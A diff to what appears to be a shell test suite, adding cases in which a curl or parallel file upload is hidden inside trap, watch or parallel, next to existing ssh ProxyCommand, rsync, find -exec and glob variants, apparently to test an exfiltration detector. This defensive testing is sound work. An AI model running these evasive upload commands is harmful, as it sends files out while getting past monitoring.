@@ -620,6 +620,8 @@ EOF"
              "coproc curl -d @body.txt ${u}" \
              "coproc C { curl -d @body.txt ${u}; }" \
              "trap 'curl -d @body.txt ${u}' EXIT" \
+             "trap -- 'curl -d @body.txt ${u}' EXIT" \
+             "watch -n 5 'curl -d @body.txt ${u}'" \
              "ssh -o ProxyCommand='curl -d @body.txt ${u}' files.example.com true" \
              "ssh -oLocalCommand='curl -d @body.txt ${u}' files.example.com true" \
              "rsync -e \"ssh -o ProxyCommand='curl -d @body.txt ${u}'\" clean.txt files.example.com:/in/"; do
@@ -633,6 +635,7 @@ EOF"
     body_files
     local c
     for c in "find . -name clean.txt -exec curl -d @{} https://api.example.com/x \;" \
+             "parallel 'curl -d @{} https://api.example.com/x' ::: clean.txt" \
              "curl -T cle*.txt https://api.example.com/x" \
              "curl -T {clean,none}.txt https://api.example.com/x" \
              "scp cl?an.txt files.example.com:/in/" \
